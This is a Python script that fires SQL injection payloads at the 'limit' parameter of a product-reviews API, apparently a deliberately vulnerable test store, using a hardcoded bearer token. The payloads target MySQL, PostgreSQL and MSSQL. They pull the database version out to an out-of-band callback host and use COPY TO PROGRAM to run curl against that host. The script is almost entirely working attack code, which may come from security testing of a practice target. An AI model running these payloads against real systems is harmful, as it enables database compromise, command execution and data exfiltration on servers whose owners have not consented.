import requests
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNDA4YTFhNzMtYzU2YS00NmVjLTlmMGQtNDRhNDViM2M1MzUxIiwidXNlcm5hbWUiOiJ0ZXN0dXNlcl9zcWxtYXAiLCJyb2xlIjoidXNlciIsImV4cCI6MTc5MDY1MDgyM30.9ze9AipKZPtkQe1vAor4bY2QC5T6880-m1Fs9f6Vvug"
headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}

url = "https://duck-store.escape.tech/api/v1/reviews/product/1"

oob_host = "oobb3997e2fdc44.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in"

# MySQL/MariaDB payloads
payloads = [
    "10 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),\'." + oob_host + "\test')))",
    "10 AND (SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT @@version), 0x3a)))",
    "10; COPY (SELECT '" + oob_host + "') TO PROGRAM 'curl http://" + oob_host + "/pg';--",
    "10; EXEC master..xp_dirtree '//" + oob_host + "/test'--",
    "10 AND (SELECT pg_sleep(0))--",
    "10 AND (SELECT dblink_send_query('host=" + oob_host + " dbname=postgres user=postgres password=postgres','SELECT version()'))--",
]

for payload in payloads:
    params = {"skip": 0, "limit": payload}
    try:
        r = requests.get(url, params=params, headers=headers, timeout=10)
        print("limit=" + payload[:80] + "...: Status=" + str(r.status_code) + ", Len=" + str(len(r.text)))
    except Exception as e:
        print("limit=" + payload[:80] + "...: Error=" + str(e))